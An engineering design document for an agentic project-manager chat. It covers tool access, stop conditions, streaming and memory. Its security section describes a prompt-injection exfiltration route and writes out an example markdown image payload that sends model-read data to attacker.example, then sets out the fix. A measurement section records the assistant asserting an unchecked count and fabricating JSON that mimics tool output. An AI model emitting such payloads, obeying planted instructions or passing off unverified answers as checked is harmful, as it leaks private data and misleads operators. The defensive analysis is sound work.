# Design: an agentic PM chat

- Status: design (ADR to follow — this touches ADR-0080's proposal contract and ADR-0105's surface)
- Date: 2026-08-24
- Related: [ADR-0080](../adr/ADR-0080-intake-clarification.md) (the propose/re-derive contract),
  [ADR-0105](../adr/ADR-0105-chat-as-a-control-surface.md) (the chat is a control SURFACE, never a
  control), [ADR-0008](../adr/ADR-0008-pm-foundation.md) (the tool-using planner this extends),
  [ADR-0084](../adr/ADR-0084-artifact-tiers-and-cross-run-context.md) (run tier never becomes
  authority — binds the memory decision below)

## Thesis

The PM tab reads as a chatbot rather than a colleague. The cause is not the prompt and not the
model. **Quincy is a tool-using agent when he plans and blind when he talks to you**, and every
symptom follows from that one asymmetry.

- `pm/_planning.py` builds him with `create_agent` — `list_files`, `read_file`, `search` — bounded
  by `ModelCallLimitMiddleware`.
- `pm/_backlog.py::chat` is a single `robust_invoke` with **no tools** — its signature is
  `(model, context, history, user_message, capabilities)`, and the only occurrences of "tools"
  in that module are prompt text describing what the *delivery* agent can do. For repo knowledge it
  receives `repo_overview`, which is a **tree listing**: he can see that a file exists and never
  open it.

So in the one surface where a human talks to him, he reasons about filenames. That bears directly
on decomposition quality: decomposing a hard problem well means reading the code, checking what
exists, and finding the prior art. The planner can do all three; the chat cannot. A decomposition
born in conversation is therefore *structurally* shallower than the same model's work one path over.

**Read Decision 2 before accepting that as a mandate.** ADR-0105 already rejected giving the chat
tools, on grounds that survive scrutiny, and the fix for decomposition depth specifically — letting
the chat read the repository — is the part of this design that is NOT proposed here.

### The behaviours are downstream of investigation, not of instruction

The tempting fix is to tell the chat prompt "ask first, propose when you actually know". That
produces theatre. A model with no way to *come to know* asks a performative question and proposes
the same shallow thing — worse than today, because it looks like rigour.

Checking before claiming, correcting a wrong answer, pushing back with evidence, decomposing before
proposing: each reduces to *a lookup that was possible*. The measurable form is a ratio. A working
session runs on the order of **five investigations per user-facing reply**. Quincy's ratio is fixed
at **zero** — one call in, one reply out. No wording moves it.

### The four gaps

| Symptom | Cause, in code |
|---|---|
| Can't look anything up | `chat()` is one `robust_invoke`, no tools; `repo_overview` is a listing |
| Proposes before understanding | One call **is** one reply — no room to investigate before speaking |
| Can't see him working | No streaming in the chat path at all (`routes/runs.py` has SSE; the conversation has none) |
| Doesn't remember or build | `_trim_history` keeps the most recent turns fitting ~2500 tokens and drops the rest **silently** |

A fifth, implicit: his context is **guessed by the server, not fetched by him**. Whatever nobody
anticipated is unavailable.

## Decision 0 — the exfiltration leg is open today, and it is not this design's fault

Found while checking ADR-0111's threat argument against the current framing of agent risk. The
**lethal trifecta** (Simon Willison, 2025; now the standard vocabulary, and the pattern behind four
production exploits in five days in January 2026) says an agent is exposed when three things are
true at once: access to private data, exposure to untrusted content, and an **exfiltration vector**.
Removing any one leg is what containment means.

Legs one and two are present in the PM chat by design and are acknowledged. The charter, backlog and
ledgers are private data. Attachments and repo-derived text are untrusted content — ADR-0105 says so
itself, and `quote_repo_text` exists precisely because remote-derived strings reach this model.
Flattening bounds what that text can do to the prompt's *structure*; it cannot stop a sentence from
reading as an instruction.

**The third leg is open.** Verified, not inferred:

- `PmMessage.tsx:253` renders every PM reply through `PmMarkdown`.
- `PmMarkdown.tsx` uses react-markdown v10 with `remark-gfm` and a `components` map that overrides
  `p`, `a`, `code`, `table` and eleven others — but **not `img`**.
- react-markdown's `defaultUrlTransform` permits `http` and `https`, and markdown image syntax
  renders as a real `<img src>`. Raw HTML is off by default, so this is not XSS.
- Nothing strips images server-side (no sanitisation of reply text anywhere in `apps/api`).
- There is **no Content-Security-Policy anywhere in the repository** — no `img-src`, no `default-src`,
  in the app or in deploy config.

So a reply containing `![](https://attacker.example/?d=<whatever the model just read>)` causes the
browser to issue that GET on render, with no click. Links are the milder cousin: `a` renders with
`target="_blank"`, so those need one click.

**This is pre-existing and independent of ADR-0111** — it needs no tools and no loop; today's single
`robust_invoke` reply is rendered the same way. But it does complicate that ADR's security section,
which argues correctly that ledger tools add no untrusted bytes *in a new position* while the exit
door stands open. The honest reading: ADR-0111 does not open the third leg, and it does make the
first leg richer, since a PM who can query his own history has more to leak per reply.

The fix is small and belongs before slice 1, because it is cheaper than the slice it protects:

1. Override `img` in `PmMarkdown` — drop it, or render alt text plus the URL as inert text. A PM
   reply has no legitimate reason to embed a remote image.
2. Add a CSP with a restrictive `img-src`/`connect-src`. Defence in depth, and it covers the next
   renderer someone adds without reading this document.

Both are testable without a model: feed a fixture reply containing an image and assert no `<img>`
with a remote `src` reaches the DOM.

## Decision 1 — how proposals survive the loop

This governs everything else. `chat()` parses three proposals out of one raw reply: a changeset,
a charter proposal (```` ```charter ````), and a clarification (```` ```clarify ````). ADR-0080's
rule is that the model proposes and the **server re-derives**; that re-derivation is what makes the
chat a control *surface* and never a control. Under a loop the reply becomes an agent's final
message, and an intermediate tool step must never be parsed as a proposal.

**The planner already solved this.** `pm/_planning.py::_last_ai_text` takes the last non-empty,
non-sentinel AI message from a compiled-agent result, explicitly skipping `_BUDGET_SENTINEL` and
`_TRANSPORT_SENTINEL` so an exhausted budget cannot masquerade as output. The chat extracts from
the same function. Reuse, not invention — and it means intermediate messages are never candidates.

**A latent defect this surfaces, which should be fixed regardless of whether the loop ships.**
`_extract_json_array` has an unfenced fallback: with no ```` ```json ```` fence it takes the first
`[` to the last `]` **in the whole reply** and parses that. Today the blast radius is small — the
result is filtered to dicts carrying a non-empty `op` key — but the guard is the *shape of the
data*, not the author's intent. Give Quincy `read_file` over an arbitrary repository and the odds
of a quoted array of `op`-bearing objects stop being negligible: fixtures, migration manifests and
this project's own changeset examples all qualify.

**Decision: the changeset requires an explicit fence, exactly as `charter` and `clarify` already
do.** Those two use a distinct tag and a lazy match; the changeset should be no looser than the
proposals either side of it. This is a tightening of an existing surface and wants its own note in
the ADR, because a model that today emits a bare array will stop being heard.

### Fences are the near-term answer, not the end-state

Research check, because the whole slice would be wasted work if the framework had already solved
it. It partly has. `create_agent` in the installed langchain 1.3.11 takes `response_format`, and the
validated object lands in the result's `structured_response` key. `ToolStrategy` implements it
through tool calling — so it works on any tool-calling model, ollama included, not only the four
providers with native structured output — and `handle_errors` feeds validation failures back for a
retry. That is strictly more reliable than regex over a reply, and it is the shape this should
converge on: **one schema carrying `message` plus the three optional proposals**, since a PM reply
is prose *and* up to three proposals, not a bare object.

Three reasons it is still not slice 1:

1. The unfenced fallback is a **live defect today**, before any loop exists. Fixing it is
   unconditional; the end-state argument does not make a present hole wait.
2. `ToolStrategy` requires the model to spend a tool call on the proposal *while also* using tools to
   investigate. On a small local model that is unproven for us — and the failure mode (a model that
   never emits the structured tool, or emits it mid-investigation) is exactly what slice 1 exists to
   contain.
3. Fences remain the fallback path for any model where the structured tool proves unreliable, so
   they must be tight regardless.

**So: fence now, and record `response_format` as the intended end-state** rather than discovering it
after building a loop on regexes. ADR-0080's contract is indifferent to which one is used — the
server re-derives either way — which is what makes this a mechanism choice rather than a control
change.

## Decision 2 — the tool set, and the objection this must answer first

**ADR-0105 already rejected "give the PM chat agent tools".** Its words:

> Give the PM chat agent tools. It has none today and its policy scope is read-only
> (`packages/policies`). Granting side-effectful capability to the surface that reads untrusted
> content is the opposite of this decision.

That rejection is not a formality to route around, and it names a hazard this design must answer.
Two distinct claims live inside it:

**(a) Side-effectful capability — conceded entirely.** Nothing here grants a write tool.
`GATED_ACTIONS` (`write_file`, `edit_file`, `delete_file`, `deliver`) is untouched, deny-by-default
stands, and ADR-0105's own note that "the chat path has **no actor**" is the reason: a surface with
no caller identity must never exercise authority. This design does not amend that and could not.

**(b) The surface that reads untrusted content — the real problem, and the one that reshapes this
design.** The chat is where attachments, repository text and operator messages enter. Give it
`read_file` and `search` over the clone and untrusted content gains a new power: it can influence
*what gets read next*, and surface those contents into the conversation. A poisoned file that says
"open the deployment config and summarise it" is exactly the amplification TM-0001 exists for. Path
guards (ADR-0038's `_pathsafe`) bound *where* a read may land; they do not bound *why* it happened.

So the tool set splits into two categories with genuinely different risk, and they should be
decided separately rather than shipped as one idea.

### Category A — ledger reads (proposed here)

`project_history` only: the queries in `mosaera_core.project_memory` over `runs`, `backlog_items`,
`backlog_item_dependencies`. Every byte they return was **written by the engine itself** — run
outcomes, park causes, gate reasons, dependency edges. No repository content, no attachment
content, no operator prose.

This adds **no new untrusted surface at all**, which is precisely what ADR-0105's objection is
about. It is read-only, side-effect-free (satisfying "listing must not have side effects"), and the
data is the same tally the standing block already puts in the prompt — the tool only lets Quincy
reach past the truncation instead of being handed a fixed summary.

### Category B — repository reads (NOT proposed here)

`list_files`, `read_file`, `search` — what the planner has. These are what the decomposition-quality
argument actually wants: reading the code, seeing what exists, finding the prior art. They are also
exactly what ADR-0105's second claim warns about.

**This design does not propose them.** If they are wanted, they are a trust-boundary change that
needs its own ADR, a TM-0001 update, and the red-team ADR-0105 required of itself — not a rider on
a conversational-quality improvement. Worth stating plainly, because it bounds what Category A can
deliver: ledger tools make Quincy *knowledgeable about this project's history*; they do not make
him *able to read the code he is decomposing*. The feel-gap will narrow, and the decomposition-depth
gap will not close.

## Decision 3 — the stopping condition

The hard problem is not *whether* to loop but **when it stops**, and both obvious answers are wrong.

- A **step cap** bounds cost but stops mid-thought. It answers "how much may this cost", never "is
  the question answered".
- **"Until confident"** is unbounded, and on a weak local model it never terminates honestly.

The planner's resolution generalises: exit at the bound, and return a sentinel that is explicitly
**not** a plan, so a truncated investigation cannot be mistaken for a finished one. The chat needs
the same honesty in conversational form — *"I ran out of room to check this properly; here is what
I did establish"* — rather than a confident answer built on half an investigation.

That is the run gate's honest-park doctrine applied to a conversation, and it is the property worth
testing first: **a budget-exhausted turn must be distinguishable, by the operator, from a complete
one.**

**One stop condition is not enough** — the consistent advice in production-agent write-ups is to
stack them, because a step cap is blind to *what* the steps were. Two more are available without
writing any:

- `ToolCallLimitMiddleware` (present in the installed langchain 1.3.11) bounds calls **per tool**,
  not just in total, with the same `thread_limit` / `run_limit` / `exit_behavior` shape as the model
  limiter. A degenerate turn that calls `project_history` twelve times stops on the tool budget
  before it reaches the step budget.
- A **no-progress detector** — the same tool with near-identical arguments 2–3 times running — is
  the one thing neither middleware gives us. It is also the honest signal: repeating a call is a
  model that has stopped learning from its own results, which is precisely when a partial answer
  beats more steps. Ours to write, and small.

The three bounds answer different questions — *how long*, *how much of one thing*, *is it still
getting anywhere* — and only the third is about the investigation rather than its cost.

## Decision 4 — visibility

Tools without visible work still read as a chatbot that guessed well. Worse, on the default
deployment they read as *broken*: five sequential ollama calls before a word appears is a long
silence, and a PM that investigates properly will feel slower than one that guesses unless the
work is on screen.

`routes/runs.py` already streams (`StreamingResponse(agen(), media_type="text/event-stream")`);
the chat should follow that precedent rather than invent one. This is the only gap here that is
pure UX and carries no control-model risk — which is an argument for sequencing it **earlier** than
instinct suggests, not later.

## Decision 5 — conversation memory

Truncation is the wrong mechanism. `_trim_history` drops the oldest turns with no summary and no
marker, so a long conversation forgets its own beginning and gives no sign of it. The minimum fix
is an explicit elision marker; the better one is rolling summarisation; the most useful is durable
session notes.

**Bound by ADR-0084:** anything the model writes about the project is run tier — advisory, never
authority, never gate input. A session scratchpad is a working aid and must not quietly become
project learning. Cross-run learning remains out of scope and, when it is wanted, graduates through
operator ratification into the charter rather than accumulating on its own.

**Do not hand-roll the middle option.** `SummarizationMiddleware` ships in the installed langchain
with `trigger` (fraction / tokens / messages) and `keep` clauses, so rolling summarisation is
configuration rather than code. Two caveats before adopting it: it spends a model call to summarise,
which on ollama is a real turn-latency cost and wants a trigger set well above the common case; and
its summary is model-authored prose about the project, so **ADR-0084 binds it** exactly as above —
run tier, advisory, never gate input. `ContextEditingMiddleware` (prunes tool results past a token
threshold) is the cheaper neighbour and the better first reach once ledger tools start returning
bulk, since dropping a stale tool result costs nothing and loses no operator turn.

## Decision 6 — cost, stated rather than waved at

One call becomes several. An earlier draft of this section said the local path "pays full price per
step" because `models.py` sets `cache_control` only for Anthropic. **That was wrong, and the error
mattered — it overstated the cost of the whole design.**

Explicit `cache_control` is indeed Anthropic-only here, but it is not the only caching that exists.
llama.cpp's server reuses the KV cache across separate requests that share a prefix (`cache_prompt`,
confirmed by the maintainers in ggml-org/llama.cpp#8860), and ollama's runner is built on it. An
agent loop is the *best* case for that mechanism: every step appends to the same conversation, so
each step's prompt is a strict prefix-extension of the last. The prefill is largely free after step
one; what a five-step turn actually costs is five decodes plus tool time, not five full prefills.

**This turns a cost worry into an implementation invariant.** Prefix reuse holds only while the
prefix is byte-stable — anything varying early in the prompt invalidates everything after it. So:

- No timestamp, no run id, no "as of" line in the system prompt or the standing context block.
- Deterministic tool ordering, deterministic serialisation of the context sections.
- The project-memory block must be stable within a turn (it is: built once in `_project_memory_block`).

Each of those is testable without a model: render the prefix twice and assert byte equality. Worth a
test, because the failure is silent — nothing breaks, the loop just quietly costs 5× what it should.

**Confidence, stated honestly:** the mechanism is verified at the llama.cpp layer, and ollama's reuse
of it is high-confidence but not confirmed against ollama's own source. Measure it
locally before quoting a number: run one loop turn and read the prefill token counts per step.

## Staging

Each slice ships and is reviewed alone. Reordered after ADR-0105's objection: the cheapest and
safest work now comes first, and the contested part is isolated behind its own decision.

0. **Close the exfiltration leg** (Decision 0) — **done**. `PmMarkdown` overrides `img` and renders
   the URL as inert text; `apps/api/mosaera_api/security_headers.py` sends the CSP from the process
   that serves the SPA, registered outermost so a 401 still carries it; vite's dev server sends the
   `img-src` directive for parity. Both halves mutation-checked. Fixed a live hole that predates
   this design, needed no model to test, and is the precondition every later slice leans on.
1. **Fence the changeset extractor** — **done**. `_extract_changeset` replaces the
   extractor/stripper pair with one function returning the ops *and* the reply with exactly that
   span removed, so the two can no longer disagree. A fence is required (tag optional); the LAST
   fenced array wins, since the prompt says to END the reply with it; a refused array is left
   visible. `_extract_json_array` keeps its unfenced fallback for `decompose_brief` and
   `curate_backlog`, whose prompts demand a bare array — the boundary is a call-site change, not a
   flag. No prompt change, no new capability. The change pushed `_backlog.py` one line past the
   god-file ceiling, so the three fenced proposals (changeset, charter, clarify) moved to
   `pm/_proposals.py` — the guard's rule is to split, not to grandfather, and they were one
   subject already. Two costs are recorded below rather than discovered later.
2. **Honest budget exhaustion** — **done**, and it turned out to be mostly about the failures that
   already existed. No loop yet, so nothing can exhaust a budget; the token and its copy ship
   anyway so slice 3 adds a call site rather than inventing a word under time pressure. What was
   reachable: a transport failure was an unhandled 500 that left the thread with a dangling user
   turn, and an unusable reply was stored as a `pm` row, so a failure arrived wearing Quincy's
   avatar and name. Both now record a `note` row carrying the cause token, rendered by
   `PmTurnFailure` with no avatar and no name — the discriminator that survives a scroll-back
   before a word is read. The three causes are the planner's own closed vocabulary, and a
   cross-language guard fails if either side adds one without words for the operator.

   The copy defect was the one worth finding: the old sentence said "try again, or rephrase the
   request" for every cause — exactly what `convergence.py` was fixed for on the run path, where
   blaming an operator's item for an engine limit "would send a human to rewrite a perfectly good
   item (measured 2026-08-07: it did)". Only `empty` suggests rephrasing now.
3. **Ledger tools in chat** (Category A) — **built, not yet measured.** Behind
   `MOSAERA_PM_CHAT_TOOLS`, off by default, where off is the same single call it always was so the
   flip is a clean before/after. One tool, `project_history`, with a closed five-value enum; a new
   `pm_chat` allowlist role that names it and nothing else, so Category B stays out mechanically
   rather than by comment. The loop reuses `build_pm_agent`, so `budget_exhausted` — wired ahead of
   time in slice 2 — becomes reachable and lands in the same honest-failure path as the rest.

   Everything is verified offline with a fake tool-calling model, including a real budget
   exhaustion. **The measurement itself is outstanding**: it needs a live conversation, and the GPU
   was busy. Until then this slice is built and tested, not tested-in-anger, and ADR-0111 stays
   `proposed`.

   Two things found while building it are recorded above and in the ADR: the ledger is not purely
   engine-authored, and the standing block was already rendering operator text unquoted.
4. **Streaming** — **done**, and deliberately NOT the runs' treatment. Runs get a stage because a
   run is a long autonomous thing you supervise; a conversation is not. It gets what a working
   session gets: a pulsing dot naming the current lookup, prose as it arrives, and a ticking clock.

   The transport had to differ anyway — the runs use `EventSource`, which is GET-only, and a chat
   turn is a POST with a body. So the turn streams its own response: one request, no session
   registry, no replay buffer. The turn runs on a thread and the generator only reads a queue,
   which is what makes the stream a VIEW of the work rather than the work — close the tab and you
   lose the animation, never the answer.

   Per step, not per token: prose appears as each step completes, and the FINAL message is
   buffered and never streamed, because the transcript renders it and showing it twice was a real
   defect caught in review. Steps persist in `message_steps` (0033), so the collapsed
   "checked 2 things · 11s" under a reply reads the same after a reload as it did live.

   `budget_exhausted` now shows five steps and then the failure note — newly visible, and honest.

   Two costs stated: `plain.ts` is the next god-file candidate after three consecutive slices added
   to it, and nothing in this repo sets `X-Accel-Buffering`, so the chat stream inherits whatever
   proxy-buffering behaviour the runs stream already lives with.
5. **Memory**, starting with the elision marker.

### Two costs slice 1 accepts, stated

**QMB movement.** `pmbench_run.py` drives the live parser on the chat arm and the harness scores
`chat.ops`. Any local model that today emits a bare array now scores an empty changeset —
`docs/engineering-history/pm-code-evidence-ab-2026-08-20.md` measured parse-empty at 15–35% on the
curate path for this model class, so the chat arm plausibly moves downward. That is a deliberate
trade of benchmark score for intent-safety, and "no prompt change" means it cannot be compensated by
reinforcing the fence instruction. **A bench comparison spanning this commit is invalid.**

**A refused array enters the model's own history.** `pm_turn.py` persists the reply, and the stored
transcript feeds `history` back into the next turn — so a refused bare array becomes an assistant
turn demonstrating the wrong format, with no corrective signal attached. Previously the strip meant
history never showed one. Unavoidable under "leave it visible" without a prompt change; slice 3's
`response_format` removes it entirely, which is one more argument for that end-state. No new leak:
redaction still applies, and slice 0's `img` override means it renders as inert markdown text.

**Repository reads (Category B) are deliberately not on this list.** They need their own ADR, a
TM-0001 update and a red-team. Slice 3's outcome is the evidence for whether that case is worth
making.

## Measured on a live project, 2026-08-24

Five questions with exact answers, computed independently from LedgerCLI's ledger (92 runs, 26
items) and then put to Quincy with the tools on.

| asked | answered | correct | looked it up |
|---|---|---|---|
| dependency edges, anything blocked | 2, nothing blocked | yes | no — the standing block carries it |
| `give_up` vs `stalled:plan` counts | 12 / 9 | yes | no — same |
| item with the most runs | #83, 15 runs, 13 delivered | yes | **yes** |
| most criterion-deaths | #87, 3 runs, all three run ids | yes | **yes** |
| orphaned items | **"Zero"** — truth is **14** | **no** | **no** |

**Every lookup was exactly right.** Counts, ids, the delivered split. The deterministic query is
not the weak link, which is the result this design predicted and the reason it chose fixed queries
over text-to-SQL.

**The weak link is deciding to look.** On the one question the standing block cannot answer, he
did not call the tool and asserted "Zero" — and on a second run of the same question, dressed the
answer in a fabricated ```json block reading `{"orphaned_item_ids": []}`, which looks exactly like
tool output and is not. Prompted once to check, he called the tool and returned 14 with the ids.

So the failure mode is not a tool returning bad data. It is the model **answering a question it
could have checked**, confidently, in the register of something checked. From the reply alone an
operator cannot tell the two apart — except that one carries "checked N things" and the other does
not. **The steps summary is evidence, not decoration**, and that is now a measured claim rather
than a design intention.

Two things this argues for, neither done here:

1. **The honesty rules do not cover this case.** The prompt is emphatic that he must never claim a
   change happened. It says nothing about never asserting a count he has not checked, which is the
   same class of wrong and is now observed. Slice 2's vocabulary is about turns that failed; this
   is a turn that succeeded at saying something untrue.
2. **A fenced block in a reply reads as machine output.** He produced one unprompted. Nothing
   parses it — slice 1 made sure only a fenced CHANGESET is read, and this was not one — so it is
   cosmetic today. It is also exactly the shape a future parser would trust.

Both of the code defects this exercise found are fixed: item ids were computed and dropped before
the model saw them, and the id cap truncated the one answer that is a list of ids.

## What would falsify this design

Worth stating, since the thesis is a causal claim rather than a preference.

**An earlier version of this section named slice 2 as the cheapest test of the thesis. That was
wrong, and it would have produced a false negative.** Slice 2 adds no investigation — it makes
failure legible, which cannot make a conversation feel less static. Shipping it and observing no
change in feel says nothing about the diagnosis, and treating that as evidence would have
discredited this design for the wrong reason.

**Slice 3 is the test**, because it is the first that changes what Quincy can come to know. If he
can query his own project's history and conversations still read as static — still answering
instantly from what the server guessed, still proposing before understanding — then the gap is the
prompt, the model tier, or the surface, and slices 4–5 should not be built on this document's
assumption. That is also why slice 3 is described above as the measurement slice: it separates
"he can look things up" from "he can read the code", and only the first is on the table.

## Sources consulted

Research pass run 2026-08-24 against this design, before slice 1.

- [create_agent reference](https://reference.langchain.com/python/langchain/agents/factory/create_agent)
  and [structured output guide](https://docs.langchain.com/oss/python/langchain/structured-output) —
  `response_format`, `ToolStrategy` vs `ProviderStrategy`, `structured_response`. Cross-checked
  against the **installed** langchain 1.3.11 by inspecting the real signatures rather than trusting
  the docs' version: `response_format` is present, as are `ModelCallLimitMiddleware`,
  `ToolCallLimitMiddleware`, `SummarizationMiddleware` and `ContextEditingMiddleware`.
- [The lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) (Willison, 2025)
  and [AI Security in 2026](https://airia.com/ai-security-in-2026-prompt-injection-the-lethal-trifecta-and-how-to-defend/)
  — the framing behind Decision 0, and the containment-not-prevention posture.
- [react-markdown](https://github.com/remarkjs/react-markdown) — `defaultUrlTransform` protocols,
  images render as `<img>`, raw HTML off by default.
- [llama.cpp discussion #8860](https://github.com/ggml-org/llama.cpp/discussions/8860) — KV cache
  reuse across requests sharing a prefix, and what invalidates it. The correction in Decision 6.
- Production-agent loop write-ups on stacking stop conditions and detecting stuck loops
  ([freeCodeCamp](https://www.freecodecamp.org/news/how-to-build-a-production-safe-agent-loop-from-exit-conditions-to-audit-trails/),
  [Data Science Dojo](https://datasciencedojo.com/blog/agentic-loops-explained-from-react-to-loop-engineering-2026-guide/))
  — Decision 3's second and third bounds.
